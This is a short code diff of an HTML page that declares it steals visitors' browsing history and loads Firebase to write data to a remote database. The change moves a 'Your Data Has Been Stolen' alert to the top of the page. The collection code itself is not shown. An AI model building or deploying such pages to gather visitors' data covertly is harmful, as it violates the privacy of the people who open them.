@@ -9,6 +9,7 @@
   <p>Visit this site to steal your browsing history.</p>
 
   <!-- Firebase SDK via script tag -->
+  <script>alert("Your Data Has Been Stolen ! Meow ");</script>
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-app.js";
     import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-database.js";
@@ -51,7 +52,7 @@
         console.error("Error writing data to Firebase:", error);
       });
 
-     alert("Your Data Has been stolen ! Meowww");
+     
   </script>
 </body>
 </html>
